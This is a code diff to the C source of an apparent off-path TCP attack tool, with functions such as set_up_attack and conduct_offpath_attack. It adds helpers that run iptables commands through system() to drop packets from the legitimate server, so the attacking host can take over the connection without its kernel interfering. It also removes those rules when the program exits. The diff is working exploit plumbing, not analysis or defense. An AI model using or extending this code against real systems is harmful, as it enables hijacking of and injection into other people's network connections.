@@ -149,6 +149,9 @@ int tcp_recv(struct pcap_pkthdr *pph, const void *inbuf, u_char *flags,
 char *tcp_flags(u_char flags);
 #endif
 
+int block_traffic(void);
+int unblock_traffic(void);
+
 void setterm(int mode);
 int kbhit(void);
 
@@ -189,7 +192,7 @@ void usage(char *argv0)
 int main(int argc, char *argv[])
 {
 	char *argv0;
-	int c, srvport, altport = -1, cliport = -1;
+	int ret = 0, c, srvport, altport = -1, cliport = -1;
 	char myhost[512];
 	struct sockaddr_in sin;
 	char *srvfn = NULL, *clifn = NULL;
@@ -427,7 +430,12 @@ int main(int argc, char *argv[])
 				g_ctx.inject_client_len, clifn);
 
 	/* here we go.. WOOO */
-	return set_up_attack();
+	ret = set_up_attack();
+
+	if (!unblock_traffic())
+		return 1;
+
+	return ret;
 }
 
 
@@ -641,6 +649,7 @@ void wait_until(const char *desc, struct timeval *pstart, time_t sec, suseconds_
 	if (sec != 0 && usec != 0) {
 		fprintf(stderr, "[!] %s : bad usage! specify sec or usec, not both! (%lu && %lu)\n",
 				desc, sec, usec);
+		(void)unblock_traffic();
 		exit(1); // EWW
 	}
 
@@ -651,6 +660,7 @@ void wait_until(const char *desc, struct timeval *pstart, time_t sec, suseconds_
 	if (sec > 0 && diff.tv_sec >= sec) {
 		fprintf(stderr, "[!] %s : already reached time! (%lu %lu vs. %lu %lu)\n",
 				desc, diff.tv_sec, diff.tv_usec, sec, usec);
+		(void)unblock_traffic();
 		exit(1); // EWW
 	}
 	if (usec > 0 && diff.tv_usec >= usec) {
@@ -1829,6 +1839,77 @@ int conduct_offpath_attack(void)
 
 
 /*
+ * block traffic from the legit server so we can handle it ourselves
+ */
+int block_traffic(void)
+{
+	char cmd[128];
+	int ret;
+	volatile struct sockaddr_in *psrv = &(g_ctx.legit.dst);
+
+	/* first see if it is already blocked */
+	printf("[*] Checking for existing iptables rule...");
+	fflush(stdout);
+	sprintf(cmd, "iptables -C INPUT -j DROP -p tcp -s %s --sport %u > /dev/null 2>&1",
+			inet_ntoa(psrv->sin_addr), ntohs(psrv->sin_port));
+	ret = system(cmd);
+	if (ret == 0) {
+		/* already blocking! */
+		printf("already blocked!\n");
+		return 1;
+	}
+	if (ret != 256) {
+		printf("ERROR\n");
+		if (ret == -1)
+			perror("[!] system(\"iptables -C\"... failed");
+		else
+			fprintf(stderr, "[!] system(\"iptables -C\"... failed: ret: %d\n", ret);
+		return 0;
+	}
+
+	/* okay, try to add the rule */
+	printf("nope, adding...");
+	fflush(stdout);
+	cmd[10] = 'I';
+	ret = system(cmd);
+	if (ret != 0) {
+		printf("ERROR\n");
+		if (ret == -1)
+			perror("[!] system(\"iptables -I\"... failed");
+		else
+			fprintf(stderr, "[!] system(\"iptables -I\"... failed: ret: %d\n", ret);
+		return 0;
+	}
+	printf("now blocked!\n");
+	return 1;
+}
+
+/*
+ * remove traffic block traffic!
+ */
+int unblock_traffic(void)
+{
+	char cmd[128];
+	int ret;
+	volatile struct sockaddr_in *psrv = &(g_ctx.legit.dst);
+
+	sprintf(cmd, "iptables -D INPUT -j DROP -p tcp -s %s --sport %u > /dev/null 2>&1",
+			inet_ntoa(psrv->sin_addr), ntohs(psrv->sin_port));
+	ret = system(cmd);
+	if (ret == 0) {
+		printf("[*] Un-blocked traffic from legit server\n");
+		return 1;
+	}
+
+	if (ret == -1)
+		perror("[!] system(\"iptables -D\"... failed");
+	else
+		fprintf(stderr, "[!] system(\"iptables -D\"... failed: ret: %d\n", ret);
+	return 0;
+}
+
+
+/*
  * this function sets up the attack.
  *
  * it starts by opening a raw socket and starting to capture packets for the
@@ -1878,6 +1959,11 @@ int set_up_attack(void)
 		/* exit the program here */
 		return 0;
 	}
+
+	/* drop packets from the legit host so the kernel won't respond on our
+	 * behalf */
+	if (!block_traffic())
+		return 0;
 
 	/* set the local port */
 	pconn->src.sin_port = htons(lport);
